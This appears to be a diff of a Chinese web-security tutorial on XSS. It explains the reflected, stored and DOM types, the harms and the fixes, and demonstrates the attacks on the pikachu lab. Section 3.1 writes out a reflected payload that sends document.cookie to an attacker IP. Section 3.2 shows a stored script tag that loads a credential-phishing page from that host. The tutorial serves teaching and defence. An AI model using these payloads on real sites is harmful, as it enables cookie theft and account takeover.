@@ -16,11 +16,53 @@ xss 漏洞分为存储型、反射型和dom型，在学习xss漏洞时，需要�
 2、理解 csrf、jsonp 的原理以及如何利用和防御
 ```
 
+# 一、何为XSS
+
+​		XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指恶意攻击者往Web站点里插入恶意脚本代码，当用户浏览该网站时，嵌入其里面的脚本代码会被执行，从而达到恶意用户的特殊目的。
+
+​		XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript 语言。JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript代码。
 
 
-XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指恶意攻击者往Web站点里插入恶意脚本代码，当用户浏览该网站时，嵌入其里面的脚本代码会被执行，从而达到恶意用户的特殊目的。
 
-	XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript 语言。JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript代码。
+## 1.1、原理
+
+假设有如下代码，把用户输入的参数直接输出到页面上
+
+```php
+<?php 
+ini_set("display_errors", 0);
+$str = $_GET["name"];
+echo "<h2 align=center>欢迎用户".$str."</h2>";
+?>
+```
+
+
+
+正常情况下用户提交的参数会显示到页面
+
+![image-20230106103719165](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061037250.png)
+
+
+
+如果提交一段HTML代码
+
+```
+http://127.0.0.1/xsslab/level1.php?name=<script>alert(小鸣同学)</script>
+```
+
+![image-20230106104139167](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061041219.png)
+
+会发现代码被执行了，用户输入的Script脚本，已经被写入页面中。
+
+
+
+​		攻击者可以在`<script>`与`</script>`之间输入JS代码，这段代码可能是用来盗取用户Cookie，也可能是监控键盘记录等恶意行为。
+
+​		Javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以），即使文件作为图片扩展名xxx.jpg，只要文件中包含JavaScript代码就会被执行。
+
+
+
+# 二、XSS的类型
 
 根据是否写入数据看来分类主要有反射性和存储型两大类。
 
@@ -29,37 +71,83 @@ XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开�
 - DOM型跨站脚本
 
 
-# 常见应用场景
 
-## 2.1 反射型XSS
-	反射性XSS通常需要被攻击者点击对应的链接才能触发。攻击方式:攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。
-	
-	反射型xss应用场景：比如搜索、查询，接口调用，跳转，http头获取参数地理位置，cookie，id，referer等一切输入、输出的地方。
-
-实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)
+## 2.1、反射型XSS
+​		反射性XSS也被称为非持久性XSS，通常需要被攻击者点击对应的链接才能触发。攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。
 
 
-## 2.2 存储型XSS
 
-	存储型XSS由于存储在数据库或其他持久性中间件中，所以用户只需浏览了包含恶意代码的页面即可在用户无感知的情况下触发。攻击方式:这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。 随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。
-	
-	存储型xss应用场景：比如注册处、用户名、地址、头像等信息，用户反馈、留言、修改个人信息、发表文章、评论、转发、私信等一切输入输出的地方。
+​		假设http://xmtxsec.top/xmtx.php存在xss反射型漏洞，攻击步骤如下：
 
-实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)
-
-
-## 2.3DOM型XSS
-
-	DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构一节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。
-
-![image.png](_img/02-Web安全/1655877299491-9b82ba8c-25c6-4cef-8f73-3fcaacc0e202.png)
-
-	攻击方式:用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。
-
-实例：[pikachu-XSS(跨站脚本漏洞)](/docs/bc/bc-1d84tqcobr5in)
+1. 攻击者发现网站http://xmtxsec.top/xmtx.php存在xss反射型漏洞，构造能够盗取用户Cookie的恶意代码，恶意代码会将用户的Cookie发送到指定站点。
+2. 攻击者将带有恶意代码的URL通过社工的方式使http://xmtxsec.top网站的用户点击。
+3. 用户在诱惑下点击恶意链接，那么就会将自己的Cookie通过恶意代码发送到攻击者指定的站点。
+4. 攻击者接收到用户的Cookie，可以直接适用该Cookie以用户的身份登录网站http://xmtxsec.top，从而获取用户的敏感信息。
 
 
-## 2.3 漏洞危害
+
+​		反射型xss应用场景：比如搜索、查询，接口调用，跳转，http头获取参数地理位置，cookie，id，referer等一切输入、输出的地方。
+
+
+
+
+## 2.2、存储型XSS
+
+​		存储型XSS又称为持久性XSS，当攻击者提交一段XSS代码后，被服务端接收并存储，当用户访问该页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS攻击。由于存储在数据库或其他持久性中间件中，所以用户只需浏览了包含恶意代码的页面即可在用户无感知的情况下触发。
+
+​		这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。 随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。
+
+​		存储型xss应用场景：注册处、用户名、地址、头像等信息，用户反馈、留言、修改个人信息、发表文章、评论、转发、私信等一切输入输出的地方。
+
+
+
+以DVWA靶场为例，输入
+
+![image-20230106113204918](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061132969.png)
+
+
+
+提交留言之后，再次访问该页面任然会执行恶意代码
+
+![](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061132854.png)
+
+
+
+
+## 2.3、DOM型XSS
+
+​		DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构一节点树。通过HTML DOM树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。
+
+![image-20230106143006442](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061430610.png)
+
+
+
+DOM的规定如下：
+
+- 整个文档是一个文档节点
+- 每个HTML标签十一个元素节点
+- 包含在HTML元素中的文本是文本节点
+- 每一个HTML属性是一个属性节点
+- 节点与节点之间都有等级关系
+
+
+
+假设有一段代码为
+
+```html
+<script>
+	var temp = document.URL;
+    var index = document.URL.indexOf("content=")+4;
+    var par = temp.substring(index);
+    document.write(decodeURL(par));
+</script>
+```
+
+上述代码的意思是获取URL中content参数的值，并且输出，如果输入`http://xmtxsec.top/dom.html?content=<script>alert(/xss/)</script>`，就会产生XSS漏洞。
+
+
+
+# 三、漏洞危害
 
 **钓鱼欺骗**：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。
 
@@ -68,6 +156,102 @@ XSS全称为Cross Site Scripting，为了和CSS(Cas-cading Style Sheet,)分开�
 **身份盗用**：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取用户的Cookie，就可以获取到用户对网站的操作权限，从而查看用户隐私信息。
 
 **用户劫持**：一些高级的XSS，比如xss蠕虫等。控制受害者机器向其他系统发起攻击。
+
+
+
+## 3.1、利用XSS漏洞盗取Cookie
+
+**环境准备**
+
+攻击机：192.168.1.11
+
+漏洞服务器：192.168.1.5
+
+
+
+1、在攻击机里面搭建pikachu靶场进入管理工具里的XSS后台
+
+![image-20230106154418458](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061544385.png)
+
+
+
+修改pikachu/pkxss/xcookie下的cookie.php，将**IP地址改为漏洞服务器的地址**
+
+![image-20230106154705873](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061547924.png)
+
+
+
+2、攻击者构造一个带有Payload的URL，诱使受害者点击就能取得Cookie
+
+```
+http://192.168.1.5/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.1.11%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit
+```
+
+
+
+成功获取到用户Cookie
+
+![image-20230106155025190](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061550244.png)
+
+
+
+## 3.2、利用XSS漏洞获取用户账号密码
+
+​		在一个**存在XSS漏洞的页面上面嵌入一个恶意请求**，当用户打开这个页面时这个页面就会像攻击者的服务器发送请求，这个请求会返回一个Basic认证的头部这时候会弹出一个提示框，要求受害者输入账号密码，从而盗取用户的账号密码。
+
+
+
+**环境准备**
+
+攻击机：192.168.1.11
+
+漏洞服务器：192.168.1.8
+
+
+
+1、在攻击机里面搭建pikachu靶场进入管理工具里的XSS后台
+
+![image-20230106160455324](https://cdn.jsdelivr.net/gh/xmtxsec/picture/img/202301061604376.png)
+
+
+
+修改漏洞服务器pikachu/pkxss/xfish 下的 fish.php 文件，**将IP地址改为攻击者的服务器地址**
+
+
+
+
+
+2、模拟攻击者访问漏洞服务器构造恶意代码并留言
+
+```
+你好，我是小鸣同学<script src="http://192.168.1.11/pikachu/pkxss/xfish/fish.php"></script>
+```
+
+
+
+
+
+留言结果
+
+
+
+
+
+3、模拟用户访问漏洞服务器，弹窗输入账号和密码
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # XSS编码
@@ -89,7 +273,8 @@ JS提供了四种字符编码的策略，如下所示。
 这里的URL编码，也是两次URL全编码的结果。如果alert被过滤，结果为`%25%36%3 1%25%36%63%25%36%35%25%37%32%25%37%34`。在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。
 
 
-# 修复建议
+
+# 四、修复建议
 
 ## 4.1 代码层面
 
